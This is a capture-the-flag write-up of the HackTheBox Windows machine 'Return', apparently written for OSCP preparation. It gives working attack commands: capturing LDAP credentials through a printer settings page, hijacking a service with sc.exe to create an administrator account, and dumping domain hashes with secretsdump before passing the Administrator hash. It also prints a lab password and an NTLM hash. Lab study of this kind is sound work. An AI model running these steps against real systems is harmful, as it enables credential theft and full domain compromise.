+++
date = '2026-05-19T00:00:00-03:00'
draft = false
title = 'HTB: Return - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'active-directory', 'ldap', 'server-operators', 'service-abuse', 'pass-the-hash']
description = 'Write-up for the HackTheBox machine Return - capturing LDAP credentials via a printer settings page, then abusing Server Operators group membership to get SYSTEM.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-return/cover.png'
+++

Return is one of those machines where the initial foothold is almost embarrassingly easy - and then it hands you a privilege escalation path that is genuinely worth knowing. Server Operators is not talked about as much as SeBackupPrivilege, but it is just as dangerous.

## Machine info

| | |
|---|---|
| **Name** | Return |
| **Platform** | HackTheBox |
| **OS** | Windows |
| **Difficulty** | Easy |

## TL;DR

- A printer admin web panel allows changing the LDAP server address - pointing it at Kali captures cleartext credentials for `svc-printer`
- `svc-printer` has WinRM access and is a member of **Server Operators**, which allows stopping and reconfiguring Windows services
- Abused `sc.exe` to hijack a service binary path and create a local admin user
- Ran secretsdump, passed the Administrator hash via evil-winrm

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A 10.129.34.220
```

Open ports include 80 (HTTP), 88 (Kerberos), 389 (LDAP), 445 (SMB), 5985 (WinRM). Standard Windows domain controller spread. Port 80 is the interesting one.

---

## Enumeration

### Printer admin panel - credential capture

Browsing to port 80 reveals a printer settings page with an LDAP configuration section.

![settings.php showing Server Address field (currently 10.10.14.208), Server Port 389, Username svc-printer, Password masked](/images/htb-return/printer-settings.png)

The page lets you change the Server Address and submit an "Update" - which causes the printer service to authenticate to whatever LDAP server you specify. Change the address to your Kali IP, start a listener on port 389, and click Update.

```bash
nc -nlvp 389
```

![nc listener receiving connection from 10.129.34.220, output shows return\svc-printer and password 1edFg43012!!](/images/htb-return/nc-creds.png)

Cleartext credentials: `svc-printer:1edFg43012!!`

---

## Foothold

### WinRM as svc-printer

```bash
nxc winrm 10.129.34.220 -u svc-printer -p '1edFg43012!!'
```

![nxc winrm result: Pwnd! for return.local\svc-printer](/images/htb-return/nxc-winrm.png)

```bash
evil-winrm -i 10.129.34.220 -u svc-printer -p '1edFg43012!!'
```

![Evil-WinRM shell established at C:\Users\svc-printer\Documents>](/images/htb-return/evil-winrm.png)

---

## Privilege Escalation

### Server Operators group membership

```bash
whoami /groups
```

![whoami /groups showing BUILTIN\Server Operators membership](/images/htb-return/server-operators.png)

`svc-printer` is a member of **BUILTIN\Server Operators**. Members of this group can start, stop, and reconfigure Windows services - including changing the binary path (`binPath`). That is the escalation path.

```bash
whoami /priv
```

![whoami /priv: SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeChangeNotifyPrivilege, SeRemoteShutdownPrivilege, SeIncreaseWorkingSetPrivilege all Enabled](/images/htb-return/whoami-priv.png)

Note: `SeBackupPrivilege` is also present, but dumping SAM and passing the Administrator hash did not work here because the built-in Administrator account is disabled. The Server Operators path is the way forward.

### Service abuse with sc.exe

Reconfigure an existing service (`VMTools`) to run an arbitrary command when started:

```bash
sc.exe config VMTools binPath="cmd.exe /c net user hacker2 Password123! /add && net localgroup administrators hacker2 /add"
sc.exe stop VMTools
sc.exe start VMTools
```

![sc.exe config succeeds, stop/start fail with error codes (expected), net users shows hacker2 and hacker in the user list](/images/htb-return/service-abuse.png)

The start/stop fail with error 1062 and 1053 - expected, because `cmd.exe` is not a valid service executable. But the command ran before the timeout: `hacker2` now exists in the local Administrators group.

### Dump domain hashes and pass the Administrator hash

```bash
impacket-secretsdump -just-dc-ntlm printer.htb/hacker2:'Password123!'@10.129.34.220
```

![secretsdump output dumping domain NTLM hashes: Administrator, Guest, krbtgt, svc-printer, hacker, hacker2, PRINTER$](/images/htb-return/secretsdump.png)

```bash
evil-winrm -i 10.129.34.220 -u Administrator -H 32db622ed9c00dd1039d8288b0407460
```

![evil-winrm as Administrator, cd ..\Desktop, type root.txt showing flag](/images/htb-return/evil-winrm-admin.png)

Root flag captured.

---

## Takeaways (for OSCP)

- **LDAP credential capture via settings pages is a real technique.** Any application that lets you change an authentication server address is a potential credential harvester. Printers, monitoring tools, and backup agents all do this.
- **Server Operators is an underrated escalation path.** It is less famous than SeBackupPrivilege or SeImpersonatePrivilege, but service binary path hijacking via `sc.exe` is reliable and well-documented. Check group memberships carefully.
- **Service start errors do not mean the command did not run.** The `sc.exe start` returned error 1053 but the user was still created. Services that run non-service executables will always error on start - that is fine, the payload fires before the timeout.

## References

- [HackTheBox - Return](https://app.hackthebox.com/machines/Return)
- [Server Operators abuse - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups#server-operators)
- [sc.exe service binary path hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services)
- Lain Kusanagi list (OSCP prep)
